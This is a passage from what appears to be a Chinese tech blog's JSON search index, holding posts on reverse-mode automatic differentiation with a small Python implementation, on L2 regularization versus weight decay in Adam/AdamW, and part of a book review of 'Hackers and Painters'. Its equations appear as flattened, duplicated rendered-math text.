非常感谢你能看到最后，这篇文章主要是从自己学习的角度出发进行编写，所以整篇文章的目的也是为了梳理自己学习过程中的一些总结，如果这篇文章有任何地方能够帮到你，那就更好了。 . 最后如果你发现文章有任何纰漏欢迎斧正，如果你有任何建议和意见，也欢迎去评论区留言。 . Reference . 集群的一致性视角 - OneFlow . | https://github.com/Oneflow-Inc/oneflow/pull/5854/files . | https://github.com/Oneflow-Inc/oneflow/pull/4130 . | https://github.com/Oneflow-Inc/oneflow/pull/5797 . | https://github.com/Oneflow-Inc/oneflow/wiki/Functional-Interface . | https://github.com/Oneflow-Inc/oneflow/pull/5329 . | https://github.com/Oneflow-Inc/oneflow/pull/6544 . | https://cloud.tencent.com/developer/article/1891442 . | .",
            "url": "https://l1aoxingyu.github.io/blogpages/deep%20learning/userop/dl%20framework/2021/11/18/oneflow-userOp.html",
            "relUrl": "/deep%20learning/userop/dl%20framework/2021/11/18/oneflow-userOp.html",
            "date": " • Nov 18, 2021"
        }
        
    
  
    
        ,"post7": {
            "title": "AutoDiff 介绍以及简单的代码实现",
            "content": "Introduction . 梯度的计算对于各类基于梯度下降的优化方法来说非常重要，其中应用最为广泛的便是目前非常流行的神经网络中的训练，而对于深度神经网络来说，手工求解等各类求解梯度的方法非常繁琐同时也难以计算，如何有效求解梯度对于高效地训练网络来说也变得异常重要。 . 在这篇文章中会介绍一下目前主流深度学习框架中都在使用的自动微分技术，通过这个技术可以实现高效的梯度求解，使得大规模的深度网络训练成为可能。 . 什么是自动微分(AutoDiff)？ . 一般来说在计算机中使用程序求解梯度有三种方式，分别是自动微分，数值微分和符号微分，下面先简单介绍一下数值微分和符号微分，以此来引出自动微分。 . 数值微分 主要使用的方法是有限差分，因为导数可以通过下面的极限来定义 . f′(x)=lim⁡h→0f(x+h)−f(h)hf&amp;#x27;(x) = lim_{h rightarrow 0} frac{f(x + h) - f(h)}{h}f′(x)=h→0lim​hf(x+h)−f(h)​ . 所以在计算机中可以通过取一个非常小的 h 来模拟这个过程，但是通过公式也可以看出，数值微分在使用的时候计算代价非常高，因为每次计算微分的时候都需要进行前向计算，同时也存在数值稳定性的问题。 虽然不能直接在大规模计算中用来求导，不过它也有一定的作用，就是可以用来测试单个 Op 的导数是不是正确的，通常误差范围取值 1e-6. . 符号微分 主要通过符号微分的计算来推导数学公式，典型的代表就是 mathematica。这种计算方法虽然在数学上是严格正确的，但是会导致结果计算非常复杂且冗余，比如下面对两层的 soft relu 求导公式就已经非常复杂了 . . 同时有一些计算过程会被反复的重新计算，并不适合用在复杂的神经网络中，我们的目标并不是求每一个参数梯度的公式，而是系统通过计算过程获得最终的数值。 . 自动微分 是通过程序来自动求解梯度的一种通用方法，他不像数值微分在每次计算梯度的时候需要重复进行前向计算，也不像符号微分一样在计算梯度的时候需要完整推导数学公式，其会将一个复杂的计算转换成一系列 primitive 算子，然后依次对这个中间的单个算子进行梯度求解的过程，下面我们开始讲解今天的主角 AutoDiff。 . AutoDiff 的数学原理 . AutoDiff 在数学上有两种计算方式，分别是 forward mode 和 reverse mode，下面我们分别通过例子来讲一下这两种 mode 是如何进去梯度求解的。 . AutoDiff 中 forward mode 的实现原理 . forward mode 在计算梯度的时候会从最开始往后进行计算，比如为了获得 y 对 x1x_1x1​ 的导数，会不断计算中间变量 viv_ivi​ 对 x1x_1x1​ 的导数，然后使用链式法则最后就可以获得 y 对 x1x_1x1​ 的导数，下面的例子 f(x1,x2)=ln(x1)+x1x2+sin(x2)f(x_1, x_2) = ln(x_1) + x_1 x_2 + sin(x_2)f(x1​,x2​)=ln(x1​)+x1​x2​+sin(x2​) 可以清楚的描述这个过程，左边是通过 (x1,x2)(x_1, x_2)(x1​,x2​) 计算 y 的过程，右边是通过 forward mode 计算 y 对 x1x_1x1​ 导数的过程 . . 首先设定 x1=1,x2=0x_1=1, x_2=0x1​=1,x2​=0，接着不断计算 viv_ivi​ 对 x1x_1x1​ 的导数即可，中间可以通过链式法则进行计算，比如 v3˙=∂v3/∂v2∗v˙2 dot{v_3} = partial v_3 / partial v_2 * dot{v}_2v3​˙​=∂v3​/∂v2​∗v˙2​，而之前已经求了 v˙2 dot{v}_2v˙2​ 的结果，所以只需要计算当前一步的导数即可。 . 如果用数学语言来描述这个过程，就是需要计算 f 的 Jacobian 矩阵，其中 f:Rn→Rmf: mathcal{R}^n rightarrow mathcal{R}^mf:Rn→Rm 表示由 n 个独立的输入变量 xix_ixi​ 映射到 m 个相关的输出变量 yjy_jyj​。对于上面这种特殊的情况，可以把每一次 AutoDiff 的 foward pass 看成是将变量 x 的其中一个分量 x˙i=1 dot{x}_i = 1x˙i​=1 其他的分量设为 0 的一次推导。所以当 f:R→Rmf: mathcal{R} rightarrow mathcal{R}^mf:R→Rm 时，forward pass 非常高效，因为所有需要计算的偏导只需要进行一次 forward pass 即可。 . AutoDiff 中 reverse mode 的实现原理 . reverse mode 和他的名字一样，会从后往前计算导数，同样以刚才的例子 f(x1,x2)=ln(x1)+x1x2+sin(x2)f(x_1, x_2) = ln(x_1) + x_1 x_2 + sin(x_2)f(x1​,x2​)=ln(x1​)+x1​x2​+sin(x2​) 来描述这个过程，左边是通过 (x1,x2)(x_1, x_2)(x1​,x2​) 计算 f 的过程，右边则是通过 reverse mode 计算 f 对 x1x_1x1​ 导数的过程 . . 左边的计算流程是一样的，但是在求导数的过程却是相反的，设定 vˉi=∂f/∂vi bar{v}_i = partial f / partial v_ivˉi​=∂f/∂vi​，那么 vˉ5=yˉ=1 bar{v}_5 = bar{y} = 1vˉ5​=yˉ​=1，继续求 vˉ4=vˉ5∗∂v5/∂v4 bar{v}_4 = bar{v}_5 * partial v_5 / partial v_4vˉ4​=vˉ5​∗∂v5​/∂v4​，同样通过链式法则只需要计算当前一步的导数即可 . 如果用数学语言来描述这个过程，就是需要计算 f 的 Jacobian 矩阵，其中 f:Rn→Rmf: mathcal{R}^n rightarrow mathcal{R}^mf:Rn→Rm。同样对于上面这种情况，每一次 autodiff 的 backward pass 可以看成是将因变量 y 的其中一个分量 yˉi=1 bar{y}_i = 1yˉ​i​=1 其他分量设为 0 的一次推导。所以当 f:Rn→Rf: mathcal{R}^n rightarrow mathcal{R}f:Rn→R 时，reverse mode 非常高效，因为所有需要计算的偏导只需要进行一次 reverse pass 即可。 . 而我们知道在深度学习中 loss 一般都是一个标量，而参数一般都是一个高维张量，所以 f:Rn→Rf: mathcal{R}^n rightarrow mathcal{R}f:Rn→R 可以表示绝大多数深度学习模型的情况，通过上面的分析可以看出 reverse mode 效率更高，这也是为什么深度学习都是选择 reverse mode 进行梯度计算的原因，这也是反向传播算法的由来。 . AutoDiff 的代码实现 . 上面讲解了自动微分的数学原理，最终仍然需要使用程序进行实现才能真正应用到深度学习中，从上面可以看到 reverse AutoDiff 更加适用于机器学习中，下面我们来讲讲 reverse AutoDiff 的代码实现。 . 伪代码讲解 . . 上面的伪代码描述了 AutoDiff 的整体计算逻辑，在代码实现中使用图这种数据结构来表示计算过程，不管是前向计算还是反向计算都可以通过图中的边和节点来描述，一个节点可以表示一种运算，而节点的入边表示这种运算需要的所有输入，出边表示该节点被其他节点所消费，建立好计算图之后，最终可以通过输入数据来计算最终需要的结果，下面我们以上面计算图为例详细描述一下整个流程。 . 上面左边的黑色子图表示 forward pass，右边的红色子图是 backward pass。 . 如果设定 xˉi=∂y/∂xi bar{x}_i = partial y / partial x_ixˉi​=∂y/∂xi​，那么 xˉ4=1 bar{x}_4 = 1xˉ4​=1； | 接着计算 x4x_4x4​ 在 forward pass 中输入节点 x2,x3x_2, x_3x2​,x3​ 对应的梯度，其中 xˉ3=xˉ4∗∂x4/∂x3=xˉ4∗x2 bar{x}_3 = bar{x}_4 * partial x_4 / partial x_3 = bar{x}_4 * x2xˉ3​=xˉ4​∗∂x4​/∂x3​=xˉ4​∗x2，所以可以看到上面 xˉ3 bar{x}_3xˉ3​ 的输入节点是 x2x_2x2​ 和 xˉ4 bar{x}_4xˉ4​； | 同理接着计算 xˉ2=xˉ4∗x3 bar{x}_2 = bar{x}_4 * x_3xˉ2​=xˉ4​∗x3​，因为还有一部分 x2x_2x2​ 的梯度由 x3x_3x3​ 提供，所以可以将当前 x2x_2x2​ 梯度写为 xˉ21 bar{x}_2^1xˉ21​ 加以区分； | 然后计算 x3x_3x3​ 在 forward pass 中输入节点 x2x_2x2​ 的梯度，xˉ22=xˉ3∗∂x3/∂x2=xˉ3∗1 bar{x}_2^2 = bar{x}_3 * partial x_3 / partial x_2 = bar{x}_3 * 1xˉ22​=xˉ3​∗∂x3​/∂x2​=xˉ3​∗1，最终可以得到 xˉ2=xˉ21+xˉ22 bar{x}_2 = bar{x}_2^1 + bar{x}_2^2xˉ2​=xˉ21​+xˉ22​； | 最后可以计算 x2x_2x2​ 的输入节点 x1x_1x1​ 的梯度得到 xˉ1=xˉ2∗x2 bar{x}_1 = bar{x}_2 * x_2xˉ1​=xˉ2​∗x2​，这样也就完成了 backward pass 的构图。 | . 通过图将流程描述清楚了，左边给出了伪代码，可以简单解释一下。 . node_to_grad 即为要求的所有节点的梯度，首先设定 out 的梯度为 1，即 xˉ4=1 bar{x}_4 = 1xˉ4​=1； | get_node_list(out) 可以取得 out 在 forward pass 中的所有节点序列，在上图中计算的所有节点序列为 x1,x2,x3,x4x_1, x_2, x_3, x_4x1​,x2​,x3​,x4​； | reverse_topo_order(nodes) 求这些节点的反向拓扑排序，即对于 forward pass 这样的有向图，按照节点出现的先后顺序进行反向排序，上面的例子在排序完成之后是 x4,x3,x2,x1x_4, x_3, x_2, x_1x4​,x3​,x2​,x1​ 这样的顺序，排序后便可进行 reverse mode AutoDiff； | 接着对所有的节点进行遍历，首先遍历到 x4x_4x4​，然后计算 xˉ4=1 bar{x}_4=1xˉ4​=1，接着计算 x4x_4x4​ 的所有输入节点的梯度，即 xˉ21,xˉ3 bar{x}_2^1, bar{x}_3xˉ21​,xˉ3​，然后把他们加入到 node_to_grad 当中等待后续的使用； | 然后遍历到 x3x_3x3​，计算其梯度 xˉ3 bar{x}_3xˉ3​，接着计算输入节点梯度 xˉ22 bar{x}_2^2xˉ22​，然后将其加入 node_to_grad 当中； | 接着遍历到 x2x_2x2​，sum partial adjoints 即为 xˉ21+xˉ22=xˉ2 bar{x}_2^1 + bar{x}_2^2 = bar{x}_2xˉ21​+xˉ22​=xˉ2​ 这样获得了 x2x_2x2​ 的梯度，然后计算器输入节点 x1x_1x1​ 的梯度就完成了整个的计算过程； | . Python 代码实现 . 首先需要对图中的节点进行定义，这个节点中需要包含输入节点，以及他们的具体运算，也就是 Op。 . class Node(object): &quot;&quot;&quot;Node in a computation graph.&quot;&quot;&quot; def __init__(self): &quot;&quot;&quot;Constructor, new node is indirectly created by Op object __call__ method. Instance variables self.inputs: the list of input nodes. self.op: the associated op object, e.g. add_op object if this node is created by adding two other nodes. self.const_attr: the add or multiply constant, e.g. self.const_attr=5 if this node is created by x+5. self.name: node name for debugging purposes. &quot;&quot;&quot; self.inputs = [] self.op = None self.const_attr = None self.name = &quot;&quot; def __add__(self, other): &quot;&quot;&quot;Adding two nodes return a new node.&quot;&quot;&quot; if isinstance(other, Node): new_node = add_op(self, other) else: # Add by a constant stores the constant in the new node&#39;s const_attr field. # &#39;other&#39; argument is a constant new_node = add_byconst_op(self, other) return new_node def __mul__(self, other): &quot;&quot;&quot;TODO: Your code here&quot;&quot;&quot; if isinstance(other, Node): new_node = mul_op(self, other) else: # Multiply by a constant stores the constant in the new node&#39;s const_attr field. new_node = mul_byconst_op(self, other) return new_node # Allow left-hand-side add and multiply. __radd__ = __add__ __rmul__ = __mul__ def __str__(self): &quot;&quot;&quot;Allow print to display node name.&quot;&quot;&quot; return self.name __repr__ = __str__ . 对于每一个 node，建立上面的类，其中 self.inputs 记录了这个节点计算需要的输入节点，self.op 表示需要对这些输入进行的运算，__add__ 和 __mul__ 这两种 magic method 可以使得两个节点 node1 和 node2 可以支持 node1 + node2 和 node1 * node2 的操作。 . 接着需要定义具体的 Op，首先定义一个基类 Op，所有实际的 Op 都需要继承这个基类，在 Op 中需要包含 forward 和 backward 两种运算。 . class Op(object): &quot;&quot;&quot;Op represents operations performed on nodes.&quot;&quot;&quot; def __call__(self): &quot;&quot;&quot;Create a new node and associate the op object with the node. Returns - The new node object. &quot;&quot;&quot; new_node = Node() new_node.op = self return new_node def compute(self, node, input_vals): &quot;&quot;&quot;Given values of input nodes, compute the output value. Parameters - node: node that performs the compute. input_vals: values of input nodes. Returns - An output value of the node. &quot;&quot;&quot; raise NotImplementedError def gradient(self, node, output_grad): &quot;&quot;&quot;Given value of output gradient, compute gradient contributions to each input node. Parameters - node: node that performs the gradient. output_grad: value of output gradient summed from children nodes&#39; contributions Returns - A list of gradient contributions to each input node respectively. &quot;&quot;&quot; raise NotImplementedError class AddOp(Op): &quot;&quot;&quot;Op to element-wise add two nodes.&quot;&quot;&quot; def __call__(self, node_A, node_B): new_node = Op.__call__(self) new_node.inputs = [node_A, node_B] new_node.name = &quot;(%s+%s)&quot; % (node_A.name, node_B.name) return new_node def compute(self, node, input_vals): &quot;&quot;&quot;Given values of two input nodes, return result of element-wise addition.&quot;&quot;&quot; assert len(input_vals) == 2 return input_vals[0] + input_vals[1] def gradient(self, node, output_grad): &quot;&quot;&quot;Given gradient of add node, return gradient contributions to each input.&quot;&quot;&quot; return [output_grad, output_grad] . 上面在基类 Op 中定义了 __call__ 这个 magic method，通过 op() 会调用 __call__()，会创建一个新的 node，同时将 node 的 op 设为为当前 op。 . 另外以一个实际的 AddOp 为例，__call__ 方法需要输入为 node_A, node_B，首先调用 Op.__call__(self) 即先调用基类 Op 的 __call__ 方法，接着再将 node_A, node_B 设定为这个节点的输入节点。 . compute 是给定输入节点的值，计算输出结果，gradient 为给定当前节点的梯度，返回输入节点的梯度，这里因为是简单的 add 操作，所以梯度就为当前节点，下面可以看看一个更复杂的矩阵乘法 Op，逻辑是类似的，只是 compute 和 gradient 计算会更加复杂。 . class MatMulOp(Op): &quot;&quot;&quot;Op to matrix multiply two nodes.&quot;&quot;&quot; def __call__(self, node_A, node_B, trans_A=False, trans_B=False): &quot;&quot;&quot;Create a new node that is the result a matrix multiple of two input nodes. Parameters - node_A: lhs of matrix multiply node_B: rhs of matrix multiply trans_A: whether to transpose node_A trans_B: whether to transpose node_B Returns - Returns a node that is the result a matrix multiple of two input nodes. &quot;&quot;&quot; new_node = Op.__call__(self) new_node.matmul_attr_trans_A = trans_A new_node.matmul_attr_trans_B = trans_B new_node.inputs = [node_A, node_B] new_node.name = &quot;MatMul(%s,%s,%s,%s)&quot; % (node_A.name, node_B.name, str(trans_A), str(trans_B)) return new_node def compute(self, node, input_vals): &quot;&quot;&quot;Given values of input nodes, return result of matrix multiplication.&quot;&quot;&quot; &quot;&quot;&quot;TODO: Your code here&quot;&quot;&quot; assert len(input_vals) == 2 if node.matmul_attr_trans_A: input_vals[0] = np.transpose(input_vals[0]) if node.matmul_attr_trans_B: input_vals[1] = np.transpose(input_vals[1]) return np.dot(input_vals[0], input_vals[1]) def gradient(self, node, output_grad): &quot;&quot;&quot;Given gradient of multiply node, return gradient contributions to each input. Useful formula: if Y=AB, then dA=dY B^T, dB=A^T dY &quot;&quot;&quot; &quot;&quot;&quot;TODO: Your code here&quot;&quot;&quot; if node.matmul_attr_trans_A: dA = matmul_op(node.inputs[1], output_grad, trans_B=True) else: dA = matmul_op(output_grad, node.inputs[1], trans_B=True) if node.matmul_attr_trans_B: dB = matmul_op(output_grad, node.inputs[0], trans_A=True) else: dB = matmul_op(node.inputs[0], output_grad, trans_A=True) return [dA, dB] . 如果完成了所有 primitive Op 的构建，那么复杂的计算也可以由多个 primitive Op 构成，有了 Op 的计算，接着可以开始构建计算图了。 . class Executor: &quot;&quot;&quot;Executor computes values for a given subset of nodes in a computation graph.&quot;&quot;&quot; def __init__(self, eval_node_list): &quot;&quot;&quot; Parameters - eval_node_list: list of nodes whose values need to be computed. &quot;&quot;&quot; self.eval_node_list = eval_node_list def run(self, feed_dict): &quot;&quot;&quot;Computes values of nodes in eval_node_list given computation graph. Parameters - feed_dict: list of variable nodes whose values are supplied by user. Returns - A list of values for nodes in eval_node_list. &quot;&quot;&quot; node_to_val_map = dict(feed_dict) # Traverse graph in topological sort order and compute values for all nodes. topo_order = find_topo_sort(self.eval_node_list) &quot;&quot;&quot;TODO: Your code here&quot;&quot;&quot; for node in topo_order: if isinstance(node.op, PlaceholderOp): continue input_vals = [node_to_val_map[input_node] for input_node in node.inputs] node_val = node.op.compute(node, input_vals) node_to_val_map[node] = node_val # Collect node values. node_val_results = [node_to_val_map[node] for node in self.eval_node_list] return node_val_results . Executor 首先将所有需要求值的 node 收集到 eval_node_list 当中，不需要求值的 node 最终的结果并不需要保留，可以起到节约内存的目的，接着在 run 中计算 forward pass，通过对有向图进行拓扑排序可以获得节点的先后顺序，接着遍历每一个节点，对于 placeholder 直接跳过，因为其直接通过用户从 feed_dict 中提供，比如最上面例子中的 x1x_1x1​。 . 对于其他节点，遍历他的输入节点，通过 node_to_val_map[input_node] 获得其值，然后将值传入到 node.op.compute 中进行计算得到节点的值 node_val，同时将其存入 node_to_val_map 中，通过不断计算最终可以获得所有节点的值，将其存在 node_val_results 中。 . 有了 forward pass 的构图后便可以开始进行 reverse AutoDiff 的构图，代码如下 . def gradients(output_node, node_list): &quot;&quot;&quot;Take gradient of output node with respect to each node in node_list. Parameters - output_node: output node that we are taking derivative of. node_list: list of nodes that we are taking derivative wrt. Returns - A list of gradient values, one for each node in node_list respectively. &quot;&quot;&quot; # a map from node to a list of gradient contributions from each output node node_to_output_grads_list = {} # Special note on initializing gradient of output_node as oneslike_op(output_node): # We are really taking a derivative of the scalar reduce_sum(output_node) # instead of the vector output_node. But this is the common case for loss function. node_to_output_grads_list[output_node] = [oneslike_op(output_node)] # a map from node to the gradient of that node node_to_output_grad = {} # Traverse graph in reverse topological order given the output_node that we are taking gradient wrt. reverse_topo_order = reversed(find_topo_sort([output_node])) for node in reverse_topo_order: # Sum partial adjoints from output edges to get output_grad output_grad = zeroslike_op(node_to_output_grads_list[node][0]) for partial_grad in node_to_output_grads_list[node]: output_grad = output_grad + partial_grad # Get grad for input in node.inputs input_grads = node.op.gradient(node, output_grad) for i, input_node in enumerate(node.inputs): if input_node not in node_to_output_grads_list: node_to_output_grads_list[input_node] = [input_grads[i]] else: node_to_output_grads_list[input_node].append(input_grads[i]) node_to_output_grad[node] = output_grad # Collect results for gradients requested. grad_node_list = [node_to_output_grad[node] for node in node_list] return grad_node_list . 整体思路和之前的伪代码一致: . 首先通过 node_to_output_grads_list[output_node] = [oneslike_op(output_node)] 将输出节点的梯度设为 1，因为我们约定计算的梯度是 reduce_sum(output_node) 对于 output_node 是向量的情况，这也是通常机器学习中 loss 的情况； | 接着找到反向的拓扑排序之后，对所有的节点进行遍历，然后先通过 zeroslike_op 初始化一个全 0 node 用于后续求和梯度，最终 output_grad 即为 loss 对当前 node 的梯度； | 然后需要求在 forward pass 下当前 node 的 input_node 的梯度，因为这一步就是一个 primitive 的计算，所以直接调用 node.op.gradient(node, output_grad) 即可获得 input_node 的梯度，每个 op 的 gradient 都由之前我们定义每一个 op 时候手工已经写好了； | 接着将 input_node 加入到 node_to_output_grads_list 中而不是 node_to_output_grad，因为这个节点可能也是其他节点的 input_node，所以可能存在多个梯度，需要完成了所有梯度的计算后再求和才是最终的梯度； | 最后将这个当前 node 的梯度放入到 node_to_output_grad 用于后续的计算，因为当前 node 已经不可能是其他节点的 input_node (拓扑排序)，所以这里计算得到的梯度是完整的； | . 通过上面的方式只需要反向遍历一次所有的 node 便可构建好反向图，同时输入实际的数据之后就可以得到前向的计算结果和反向的梯度结果，只是这里要注意在构建反向图时，所有的计算也是 node 之间的计算，两个 node 的求和 x+y 其实调用的是 __add__ 即内部调用的实际是 add_op, add_byconst_op。 . Ending . 这篇文章介绍了自动微分的基本概念，然后分别从数学和代码实现的角度出发解释了自动微分的原理，也给了一个自动微分的代码示例，不过自动微分是一个非常复杂的系统，这里展示的只是冰山一角，还有很多内容可以探索，比如如何进行高效的高阶导计算等等，感兴趣的同学可以从下面的参考链接中继续学习自动微分相关的知识。 . 最后希望这篇文章能够帮助到你们，如果你有任何建议和问题欢迎在评论去留言。 . Reference link . Automatic Differentiation in Machine Learning: a Survey . | HIPS/autograd: Efficiently computes derivatives of numpy code. (github.com) . | CSC321 Lecture 10: Automatic Differentiation (toronto.edu) . | dlsys-course/assignment1-2018: Assignment 1: automatic differentiation (github.com) . | autodiff (washington.edu) . | CSE599W lecture4 自动微分_skyday123的博客-CSDN博客 . | .",
            "url": "https://l1aoxingyu.github.io/blogpages/deep%20learning/autodiff/dl%20framework/2021/11/10/autodiff.html",
            "relUrl": "/deep%20learning/autodiff/dl%20framework/2021/11/10/autodiff.html",
            "date": " • Nov 10, 2021"
        }
        
    
  
    
        ,"post8": {
            "title": "L2 regularization 和 weight decay",
            "content": "Introduction . 通常我们在说 weight decay 的时候，都认为也是在说 L2 regularization，那么到底他们的实现是什么以及他们是否等价呢？这篇文章是一个简单的总结。 . weight decay 和 L2 regularization 的原理 . weight decay 的原理是在每次进行梯度更新的时候，额外再减去一个梯度，如果以普通的梯度下降为例，公式如下 . θt+1=(θt−η∇(θt))−λθt=(1−λ)θt−η∇(θt) theta_{t+1} = ( theta_{t} - eta nabla( theta_t)) - lambda theta_t = (1 - lambda) theta_{t} - eta nabla( theta_t)θt+1​=(θt​−η∇(θt​))−λθt​=(1−λ)θt​−η∇(θt​) . 其中 λ lambdaλ 就是 weight decay 中设定的超参数，通常设定比较小。 . L2 regularization 的原理是在计算 loss 的时候增加一个惩罚项，L2 即为增加一个二范数的惩罚项，即 . freg(θt)=f(θt)+λ2∣∣θ∣∣22f^{reg}( theta_t) = f( theta_t) + frac{ lambda}{2} || theta||_2^2freg(θt​)=f(θt​)+2λ​∣∣θ∣∣22​ . 那么这时对参数求导并进行反向传播就可以有下面的公式 . ∂freg/∂θt=∂f/∂θt+λθt partial f^{reg} / partial theta_t = partial f / partial theta_t + lambda theta_t∂freg/∂θt​=∂f/∂θt​+λθt​ . 那么再进行梯度更新的时候 L2 reg 就相当于额外减去 η∗λ∗θt eta * lambda * theta_tη∗λ∗θt​，其中 η etaη 是学习率，λ lambdaλ 是 L2 reg 中设定的超参数 . 通过上面的公式可以看出 L2 reg 和 weight decay 虽然原理上不一致，不过通过推导在数学形式上最后只差一个常数倍，所以是否可以认为 L2 reg 和 weight decay 是等价的呢？ . L2 reg 和 weight decay 等价吗？ . 通过上面的公式可以推导出 L2 reg 和 weight decay 是等价的，不过有一个大前提即上面的公式表达的是最普通的 SGD 更新方式，除了 vanilla SGD 之外，还有很多 variant optimizer 比如 SGDM，RMSprop，Adam 等等，下面我们以 Adam 为例再次进行 L2 reg 和 weight decay 的公式推导。 . Adam 原理 . 首先回顾一下 Adam 的工作原理，给定超参 β1,β2 beta_1, beta_2β1​,β2​ 以及学习率 η etaη，不考虑 L2 reg 和 weight decay 时，Adam 的更新公式如下 . gt←∇ft(θt−1)mt←β1mt−1+(1−β1)gtvt←β2vt−1+(1−β2)gt2m^t←mt/(1−β1t)v^t←vt/(1−β2t)θt←θt−1−ηm^t/(v^t+ϵ)g_t leftarrow nabla f_t( theta_{t-1}) m_t leftarrow beta_1 m_{t-1} + (1 - beta_1) g_t v_t leftarrow beta_2 v_{t-1} + (1 - beta_2) g_t^2 hat{m}_t leftarrow m_t / (1 - beta_1^t) hat{v}_t leftarrow v_t / (1 - beta_2^t) theta_t leftarrow theta_{t-1} - eta hat{m}_t / ( sqrt{ hat{v}_t} + epsilon)gt​←∇ft​(θt−1​)mt​←β1​mt−1​+(1−β1​)gt​vt​←β2​vt−1​+(1−β2​)gt2​m^t​←mt​/(1−β1t​)v^t​←vt​/(1−β2t​)θt​←θt−1​−ηm^t​/(v^t​ . ​+ϵ) . Adam with weight decay and L2 reg . 接下来可以在上面的公式中增加 L2 reg 和 weight decay，其中红色表示 L2 reg，绿色表示 weight decay . . 其中 m^t hat{m}_tm^t​ 是 bias correction，在 t 比较小的时候可以防止 mtm_tmt​ 因为初始值为 0 导致更新较少的问题，同时当 t→∞t rightarrow inftyt→∞ 时 m^t→mt hat{m}_t rightarrow m_tm^t​→mt​，所以在后续的公式中直接用 mtm_tmt​ 来代替 m^t hat{m}_tm^t​ . 通过对公式的进一步展开和对比，可以发现 L2 reg 和 weight decay 之间除了有个常数倍 η(1−β1) eta(1- beta_1)η(1−β1​) 的区别外，一个更大的区别是 v^t sqrt{ hat{v}_t}v^t​​ 作为分母，这里就引入了不一致性，因为当 grad 中某一个分量的值过大时，v^t sqrt{ hat{v}_t}v^t​​ 就会变大，所以导致 l2 reg 作用在对应分量上的结果变小，这其实和 weight decay 的行为是不一致的，因为 weight decay 对所有的参数都应该是相同的惩罚项，所以正是因为自适应学习率等变种 optimizer 的出现导致 l2 reg 也进行了自适应，所以会导致和 weight decay 的结果最终不同。 . 当然因为 l2 reg 是作用了初始梯度上的，而一阶矩 mtm_tmt​ 和二阶矩 vtv_tvt​ 都需要依赖 gtg_tgt​ 进行更新，所以在不断的更新中也会导致他们在 l2 reg 和 weight decay 下的结果不一致，因为这里是一个积累差异，所以在公式中就没有详细展开了。 . 在这篇文章 ICLR19 的论文 DECOUPLED WEIGHT DECAY REGULARIZATION 中详细的进行了理论的推导和分析 l2 reg 和 weight decay 的差异以及最终的结果，最终为这种真正使用 weight decay 的 Adam 取名为 AdamW 作为区分，感兴趣的同学可以直接去阅读原文。 . 到底使用 Adam 还是 AdamW . 之前大多数深度学习框架包括 TensorFlow 和 PyTorch 等都是按照 l2 reg 去实现的 Adam，不过要改为 AdamW 也比较简单，通过上面的分析是否说明我们应该把所有项目中使用的 Adam 都换成 AdamW 呢？ . 我的观点是之前项目中使用的 Adam 可以换成 AdamW 一试效果，如果精度较低就还是使用回 Adam，如果精度提升就换成 AdamW。那么为什么从上面的理论中得到 AdamW 才是正确的实现，但是实际使用 AdamW 也不一定好呢？原因有很多，因为深度神经网络是一个黑盒，没有人能详细的计算出内部的运算原理，同时之前调参和各种 tricks 都是基于 Adam 去做的，已经针对 Adam+l2 reg 的进行了比较细致的优化，这时直接换成 AdamW 可能重新做一些调参工作可以超过之前的结果，不过就不建议去做重复劳动了。 . 在新项目中可以直接使用 AdamW，同时基于 AdamW 进行调参，这样可以尽可能保证得到更好的结果，比如 Bert 就直接使用的 AdamW。 . Ending . 最后希望这篇文章能够让你了解 l2 reg 和 weight decay 之间的区别和联系，如果你有任何建议和问题欢迎在评论去留言，希望这篇文章能够帮助到你们。 . Reference . 都9102年了，别再用Adam + L2 regularization了 - 知乎 (zhihu.com) . | DECOUPLED WEIGHT DECAY REGULARIZATION . | .",
            "url": "https://l1aoxingyu.github.io/blogpages/deep%20learning/tricks/2021/11/05/l2-reg-weight-decay.html",
            "relUrl": "/deep%20learning/tricks/2021/11/05/l2-reg-weight-decay.html",
            "date": " • Nov 5, 2021"
        }
        
    
  
    
        ,"post9": {
            "title": "《黑客与画家》读后感",
            "content": "最近读完了一本书，叫《黑客与画家》，其作者 Paul Graham 被誉为硅谷创业之父，是 Lisp 的狂热爱好者，同时使用 Lisp 创立了 Viaweb，帮助个人用户在网上开店，这也是第一个互联网应用程序，在 1998 年被 Yahoo！公司收购。 . Paul 的经历非常传奇，在 Viaweb 被收购之后，也可以在个人网站上撰写血多关于软件和创业的文章，随后身体力行，创立了风险投资公司 Y Combinator，目前已经资助了超过 80 多家创业公司。 . 在《黑客和画家》中，Paul 首先为大众眼中 的“黑客”正名，黑客是 Hacker 的音译，因为名字里面有“黑”，且在报道中总是出现负面新闻，所以大众认为黑客就是对计算机系统和网络进行可以破坏的人。其实真正的黑客主要是指技术高超的程序员，而 Cracker 才是指恶意破坏的人。 . 在书中 Paul 也表达了一些比较前瞻的观点，比如用户像订报纸那样按照使用时间长短订购软件的使用权，而现在订阅模式正越来越流行。也表达了一些比较偏激的观点，比如某一种编程语言就是要优于另外一种编程语言；在高科技行业中，只有失败者采用“业界最佳实践”等等。 . 虽然有一些观念存在争议，不过仍然有一些观点我认为值得推崇，同时可以引人深思，下面列举其中的一些例子。 . 不要盲目从众 . 在第一章中 Paul 指出，在美国一般都是体育出众的小孩儿更受欢迎，而学习成绩比较好的小孩儿往往被称为 “Nerd”，也就是书呆子，作者在小时候也被称为书呆子，收到排挤。 . 长大后，Paul 思考了一下背后的原因，一方面归结于小孩儿在产生良知之前，会认为折磨就是一种娱乐；另一方面的原因就是大家找一个共同的敌人有利于“受欢迎”，就好比一个政客，他想让选民忘记糟糕的国内局势，方法就是为国家找出一个敌人，哪怕敌人并不真的存在，他也可以创造一个出来，所以书呆子就被挑选出来成为欺负的对象。 而书呆子的注意力都放在读书或者观察世界上，他们琢磨如何更聪明而不是如何更受欢迎，这也是书呆子难以融入校园环境的原因。 . 而到了成年人的世界，一切变得不太一样了，人们都变得更加成熟，你所做的每一件事儿都能产生真正意义上的效果，这是发现正确的答案就变得重要了，这正是书呆子的优势所在，也是像比尔·盖茨、扎克伯克这样的人能成功的真正原因。 所以当你发现你和周围的人格格不入，无法融入其中时，比如在学校寝室室友都在翘课打游戏，问你要不要加入他们。这时先不要着急对自我产生怀疑，先思考和确认自己目前追寻的是否是正确的事情，如果是的话，就勇敢去做，不需要迎合他们，完成自我价值的实现才能找到人生真正的意义。而在面对一些不公平的待遇时，也要学会自我调节，不要钻牛角尖，人生有多种可能，无需在一棵树上吊死。 . 编程与思考的关系 . 另外一个比较有意思的点就是编程和思考的关系，我们一般都认为写代码前要先想清楚结构，这样才有助于写出高效的代码。 . 而 Paul 认为 